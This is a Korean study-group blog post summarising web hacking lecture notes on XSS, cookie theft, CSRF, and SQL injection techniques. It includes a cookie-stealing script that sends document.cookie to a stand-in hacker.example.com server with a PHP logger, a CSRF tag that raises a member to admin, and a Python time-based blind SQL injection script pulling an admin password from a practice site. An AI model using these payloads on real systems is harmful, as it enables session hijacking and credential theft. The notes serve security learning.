---
title: "[모각코]해킹 맛보기(2.6까지) & WebHacking(5강)"
excerpt_separator: "<!--more-->"
toc: true
toc_sticky: true
categories:
  - 모각코
tags:
  - 모각코
  - Hacking
---

## 07-17 토요일

## 크로스 사이트 스크립팅

### 크로스 사이트 스크립팅(XSS)

- 웹 페이지에 스크립트를 삽입할 수 있는 취약점
- JavaScript를 통해 공격이 이루어짐

```php
/*msg 파라미터를 출력하는 xss.php 예제*/
<?
  echo $_GET['msg'];
?>
사용자가 입력한 값이 응답 페이지에서 실행되는 XSS 공격 방법을 Reflected XSS
```

- 대부분의 XSS 공격은 Stored XSS 방식

  - 주로 게시판의 악성 스크립트가 삽입된 형태로 공격
  - 사용자가 입력값을 그대로 저장해 출력하는 경우, 악의적인 사용자가 악성 스크립트 글을 작성하게 되고 다른 사용자가 해당 글을 읽게 되면 악성코드가 실행되는 방식
  - `<script>` 와 같은 태그 사용이 가능하다면 _XSS_ 혹은 _CSRF_ 공격 취약점 존재

### 쿠키 공격

- **쿠키**

  - 서버와 클라이언트를 매개해주는 역할
  - 클라이언트 단의 기록서이므로 변조가 가능해 취약점 존재

- **세션**

  - 쿠키 인증 방식 대신 사용되는 인증 방식
  - 서버에 저장되어 쿠키에 세션 이름 등록

- 쿠키 탈취 공격 예시

  - JavaScript에서 현재 페이지의 쿠키는 docuemnt.cookie에 담기며 이를 해커의 서버로 넘기면 쿠키 탈취
  - 탈취 과정

    1. 악성 스크립트 관리자에게 전송
    2. 관리자가 이메일 확인하자마자 스크립트에 의해 해커의 서버로 쿠키 정보와 함께 이동
    3. log.txt에 쿠키 정보 기록

    ```php
    /*해커의 서버(http://hacker.example.com)로 클라이언트의 쿠키 전송*/
    <script>
      window.location = 'http://hacker.example.com/xss.php?log=' + document.cookie
    </script>

    /*파라미터를 log.txt에 저장하는 xss.php*/
    <?
      $fp = fopen("log.txt","a+");
      fwrite($fp,$_GET['log']);
      fclose($fp);
    ?>
    ```

  - xss를 응용한 공격 방식들

  ![xss 응용 공격](https://user-images.githubusercontent.com/66258691/126022559-eca8ac1b-588d-4afa-afe8-8fcd9027597f.jpg){: width="50%" height=50%"}

### 사이트 간 요청 위조 공격(CSRF)

- 사용자가 자신의 의지와는 무관하게 해커가 원하는 주소를 요청시키는 공격 기법
- 예시

  ![회원정보 (2)](https://user-images.githubusercontent.com/66258691/126022751-025f1f7e-93c1-425a-921f-fbdfc71c0b5a.jpg){: width="50%" height=50%"}

  - 관리자가 페이지에서 버튼을 통해 회원정보수정을 하게되면 처리를 위해 `POST` 혹은 `GET` 메소드로 데이터를 전송
    `http://example.com/admin/member_modify_ok.php?no=198&pass=1234&passre=1234&grade=1grade`
  - 인자가 1일 때 일반, 2일 때 관리자 등급
  - _쿠키 공격_ 예제에서 다음과 같은 img 태그를 심어 보내면 198번을 관리자 등급으로 변경하게 됨
    `<img src= http://example.com/admin/member_modify_ok.php?no=198$pass=1234$passre=1234&grade=2`

### 방어 기법

- <> 를 엔티티 문자인 `&lt;`와 `&gt;` 로 치환해 태그를 막는 방법
- 많은 공격 포인트가 존재하여 해당 취약점에 대한 완벽한 방어 기법 존재 하지 않음
- 페이스북이나 구글은 자사 웹 사이트의 XSS 취약점을 발견하면 보상을 진행
  - 페이스북: <https://facebook.com/whitehat/>
  - 구글: <http://www.google.com/about/appsecurity/reward-program/>

---

## SQL Injection Advanced

### SQL Injection 공격 기법

- **Logic**

  - 논리 연산을 이용한 공격 방법

  ```
  SELECT uid
  FROM Usertable
  WHERE username="admin" and userpw="admin";
  ```

  - 위 쿼리문에서는 username이 "admin" 이며 userpw가 "admin"인 데이터의 결과만 반환
  - 하지만 다음의 쿼리문과 같이 or 연산을 사용하게 되면 모든 결과가 반환됨

  ```
  SELECT uid
  FROM UserTable
  WHERE username="admin" or 1;
  ```

  - **Union**

    - SELECT 구문의 Union절을 이용한 공격 방법
    - Union 절은 다수의 SELECT 구문의 결과를 결합시키는 행위를 수행
    - 예시

    ```
    SELECT * FROM UserTable
    UNION SELECT "DreamHack", "DreamHack PW";
    /*
    +-----------+--------------+
    | username  | password     |
    +-----------+--------------+
    | admin     | admin        |
    | guest     | guest        |
    | DreamHack | DreamHack PW |
    +-----------+--------------+
    3 rows in set (0.01 sec)
    */
    ```

    다른 테이블에 접근하거나 원하는 쿼리 결과 데이터를 생성하여  
    어플리케이션에서 처리되는 데이터 조작 가능

    - Union 절 사용 시 만족해야 할 특정 조건

      - 이전 SELECT 구문과 UNION SELECT 구문의 결과 컬럼의 수가 같아야 함
      - 특정 DBMS에서 사용 시 이전 컬럼과 UNION SELECT 구문의 컬럼의 타입이 같아야 함

  - **Subquery**

    - 하나의 쿼리 내에 또 다른 쿼리를 사용하는 것을 의미
    - 서브 쿼리를 사용하기 위해서는 (Sub Query)와 같이 괄호를 통해 선언 가능
    - 서브 쿼리에서는 `SELECT` 구문만 사용 가능

    - 사용 예시

      - COLUMNS Clause
        컬럼 절에서 사용시 단일 행, 단일 컬럼의 결과가 반환되도록 해야함

      - FROM Clause
        FROM 절에서 사용되는 서브 쿼리 _Inline View_
        Inline View 에서는 다중 행, 다중 컬럼의 결과 사용 가능

      - WHERE Clause
        WHERE 절에서 사용 시 조건 검색을 위해 다중 행의 결과 사용 가능

  - **Error Based**

    - 사용자가 임의적으로 에러를 발생시켜 정보를 획득하는 공격 기법
    - DBMS의 환경에 따라 사용 가능 여부 등이 달라질 수도 있음
    - DBMS에서 쿼리가 실행되기 전에 검증 가능한 에러가 아닌, Runtime 중에 발생하는 에러 필요

  - **Blind**

    - 데이터베이스 조회 후 결과를 직접적으로 확인할 수 없는 경우 사용될 수 있는 공격 기법
    - Blind SQL Injection 수행 조건

      - 데이터를 비교해 참/거짓을 구분
      - 참/거짓의 결과에 따른 특별한 응답 생성
      - ex)

      ```
      # MySQL
      SELECT IF(1=1, True, False);
      /*
      +----------------------+
      | IF(1=1, True, False) |
      +----------------------+
      |                    1 |
      +----------------------+
      1 row in set (0.00 sec)
      */
      ```

      - _Application Logic_

        - 데이터베이스의 결과를 받은 어플리케이션에서 결과 값에 따라 다른 행위를 수행하게 되는 점을 이용해 참과 거짓을 구분하는 방법
        - substr(passwrod, 1, 1) 과 같은 경우 패스워드 첫번째 문자열 반환됨 이를 통해 index를 변경하며 password 전체를 획들할 수 있음

        ```
        예시
        /*index를 조절하여 글자 획득*/
        upw=" union select substr(upw,1,1) from users where uid='admin'--

        /*한글자씩 비교해가며 성공 여부 확인*/
        upw=" or uid="admin" and substr(upw,1,1)="p
        ```

      - _Time Based_

        - 시간 지연을 이용해 참/거짓 여부를 판단
        - DBMS에서 제공하는 함수를 이용하거나, 무거운 연산과정을 발생시켜 쿼리 처리 시간을 지연시키는 heavy query 등 존재

          ```
          SELECT IF(1=1, sleep(1), 0);
          /*
          mysql> SELECT IF(1=1, sleep(1), 0);
          +----------------------+
          | IF(1=1, sleep(1), 0) |
          +----------------------+
          |                    0 |
          +----------------------+
          1 row in set (1.00 sec)
          */
          ```

          - MySQL
            - sleep 함수 `SLEEP(duration)`
            - benchmark 함수 - expr 식을 count 수만큼 실행하며 시간지연이 발생 `BENCHMARK(count, expr)`
            - heavy query  
              `information_schema.tables` 테이블은 MySQL 에서 기본적으로 제공하는 시스템 테이블이며  
              기본적으로 많은 수의 데이터가 포함되어 있는 테이블이다
              이러한 데이터가 포함된 테이블을 연산 과정에 포함시켜 시간 지연
          - MSSQL
            - waitfor `waitfor delay 'time_to_pass';`
            - heavy query
          - SQLite
            - heavy query  
              `LIKE('ABCDEFG', UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))`

      - _Error Based Blind_

        - 임의적으로 에러 발생을 일으켜 참/거짓을 판단하는 공격 기법
        - Error Based은 에러 메시지를 통해 데이터가 출력되는 에러를 이용해야 하는 반면
          Error Based Blind는 에러 발생 여부만 확인하면 됨

      - _Short-circuit evaluation_

        - 로직 연산의 원리를 이용한 방법
        - A가 거짓이라면 B의 결과와는 상관 없이 결과가 거짓 따라서 실제롤 B식을 수행하지 않는 것을 의미

      - **Blind SQL Injection Tip-1**

        - ASCII에서 출력 가능한 문자의 범위는 32~126으로 총 94개 문자 존재, 따라서 최악의 경우 94번의 요청을 전송해야함
        - 이는 비효율적이므로 다음과 같의 좀 더 효율적으로 수행하는 방법들이 존재함

        - _Binary Search_

          1. 범위 내의 중간 값을 지정하고 값을 비교
          2. 지정한 값이 찾고자 하는 값과 비교하고 범위를 조절
          3. 위 과정을 반복하여 특정한 값 찾음

        - _bit 연산_
          - ASCII는 7개의 비트를 통해 하나의 문자를 나타냄
          - 7번의 요청을 통해 한 바이트를 획득할 수 있음

      - **Blind SQL Injection Tip-2**

        - Blind SQL Injection은 다수의 요청을 통해 결과를 획득하는 공격 기법
        - 사용자가 직접 입력하는 방식은 물리적 한계 => 스크립트를 작성하여 공격 수행

        - 예시

          ```python
          #!/usr/bin/env python3
          import requests
          URL = "http://sqltest.dreamhack.io"
          DATA = ""
          for index in range(1, 100):
            for chars in range(32, 127):
              payload = "/?username='or if((select ord(substr(password,%s,1)) from users where username='admin')=%s, sleep(2), 0)-- -" %(index, chars)
              addr = URL + payload
              ret = requests.get(addr)
              loadTime = ret.elapsed.total_seconds()
              if loadTime > 1.9:
                DATA += chr(chars)
                print(DATA)
                break
          print(DATA)
          ```

### SQL DML 구문에 대한 이해

- SQL DML은 데이터베이스에서 데이터를 조회하거나, 추가/삭제/수정을 수행하는 구문

- **SELECT**

  - 데이터를 조회하는 구문
  - 예시

  ```
  # mysql SELECT Statement https://dev.mysql.com/doc/refman/8.0/en/select.html
  SELECT
      select_expr [, select_expr] ...
  FROM table_references
  WHERE where_condition
  [GROUP BY {col_name | expr | position}, ... [WITH ROLLUP]]
  [ORDER BY {col_name | expr | position} [ASC | DESC], ... [WITH ROLLUP]]
  [LIMIT {[offset,] row_count | row_count OFFSET offset}]
  ```

  - **SELECT** - 문자열을 시작으로 조회의 결과로 사용될 표현식 또는 컬럼들에 대해 정의
  - **FROM** 절에서는 데이터를 조회하기 위한 테이블의 이름 입력
  - **WHERE** 절에서는 해당 테이블내에 조회하는 데이터의 조건 설정
  - **ORDER BY** 절은 쿼리의 결과 값들을 원하는 컬럼을 기준으로 정렬
  - **LIMIT** 절은 쿼리의 결과로 출력될 row의 개수를 또는 Offset을 지정

- **INSERT**

  - 데이터를 추가하기 위한 구문

  ```
  # mysql INSERT Statement https://dev.mysql.com/doc/refman/8.0/en/insert.html
  INSERT [LOW_PRIORITY | DELAYED | HIGH_PRIORITY] [IGNORE]
      [INTO] tbl_name
      [PARTITION (partition_name [, partition_name] ...)]
      [(col_name [, col_name] ...)]
      { {VALUES | VALUE} (value_list) [, (value_list)] ...
        |
        VALUES row_constructor_list
      }
  ```

  - **INSERT** 문자열을 시작으로 INSERT 구문이 시작하며, 데이터가 추가될 테이블을 정의
  - **VALUE[ S ]** 절에서는 추가될 데이터의 값을 입력
  - `,`를 통해 여러 데이터를 한번에 추가할 수도 있음

    ```
      INSERT
        INTO boards (title, boardcontent)
        VALUES ('title 1', 'content 1'), ('title 2', 'content 2');
    ```

- **UPDATE**

  - 데이터를 수정하는 구문

    ```
    # mysql UPDATE https://dev.mysql.com/doc/refman/8.0/en/update.html
    UPDATE [LOW_PRIORITY] [IGNORE] table_references
        SET assignment_list
        [WHERE where_condition]
    ```

    - **UPDATE** 문자열을 시작으로 수정을 요청할 테이블 정의
    - **SET** 절에서는 수정할 컬럼과 수정될 데이터를 정의
    - **WHERE** 절을 통해 수정할 row 지정

    ```
    UPDATE boards
    SET boardcontent = "update content 2"
    WHERE title = 'title 1';
    ```

- **DELETE**

  - 데이터를 삭제하는 구문

    ```
    # mysql DELETE https://dev.mysql.com/doc/refman/8.0/en/delete.html
    DELETE [LOW_PRIORITY] [QUICK] [IGNORE] FROM tbl_name [[AS] tbl_alias]
        [PARTITION (partition_name [, partition_name] ...)]
        [WHERE where_condition]
        [ORDER BY ...]
        [LIMIT row_count]
    ```

    - **DELETE FROM** 문자열을 시작으로 삭제할 데이터가 존재하는 테이블 정의
    - **WHERE** 절을 통해 삭제할 데이터의 row 지정

    ```
    DELETE FROM boards
    WHERE title = 'title 1';
    ```

  ### Exploit Technique

  - SQL Injection 공격의 두가지 대표적 목적

    1. 정보 탈취(기밀성 침해)
    2. 정보 수정/삭제(무결성 침해)

  - SQL Injection 취약점 발견 ~ 공격의 목적 달성 과정
    1. SQL Injection 취약점 발견
    2. 구문 예측 / DBMS 정보 획득
    3. Exploit 작성
    4. 정보 탈취 및 수정/삭제

- **DBMS Fingerprinting**

  - DBMS의 종류를 파악하면 공격하는 것이 효율적
  - 파악 방법
    - 결과 값이 출력될 때
      - DBMS별로 다른 환경 변수 값 출력
    - 결과 값이 출력되지 않지만 에러가 출력될 때
      - 에러 메시지를 통해 DBMS 파악
    - 결과 값이 출력되지 않을 때
      - True / False 를 확인 가능한 경우
        - Blind로 함수, 조건문을 사용해 테스트
    - 출력이 존재하지 않는 경우
      - Time Based

- **System Tables**

  - 시스템 테이블에 담긴 정보를 통해 SQL Injection 취약점을 좀 더 효율적으로 공격 가능

  - 대표적인 활동 상황

  -조건

      - 게시판 서비스에서 boards 테이블에서 `SELECT` 구문을 통해 조회 시 SQL Injection 발생
      - 사용자 정보가 포함되어 있는 유저 테이블, 컬럼 정보 등을 모름

  - 공격 방법
    - 시스템 테이블의 정보를 이용하여 유저 테이블의 이름 및 컬럼 정보 획득
    - 획득한 테이블, 컬럼 정보로 유저 테이블에 접근 및 사용자 정보를 획득

- **WAF Bypass**

  - WAF는 해킹에서 주로 공격 시 사용하는 키워드들에 방어하는 시스템
  - SQL은 다양한 함수를 지원하기 때문에 다양한 방법으로 우회 가능

  - String Case Issue - selECT (대소문자 함께 사용)
  - 탐지 시 처리 미흡 - 악성 키워드 탐지 시 해당 요청을 차단하지 않고 문자열을 변환하는 등의 과정을 거친 후 처리하는 경우 발생
  - 대체 가능한 키워드 필터

- **Out Of DBMS**

  - DBMS에서 제공하는 특별한 함수 또는 기능 등을 이용해 파일 시스템, 네트워크 심지어 OS 명령어 등에도 접근 가능
  - 파일 시스템, 네트워크, 시스템 장악 가능

- **DBMS 주의사항**

  - 권한 문제
    - DBMS 어플리케이션 작동 권한
    - DBMS 계정 권한
  - String Compare
    - Case sensitive
    - space로 끝나는 문자열 비교
  - Multiple statement

- 참고자료
  - 해킹 맛보기
  - dreamhack WebHacking online lecture <https://dreamhack.io/lecture>
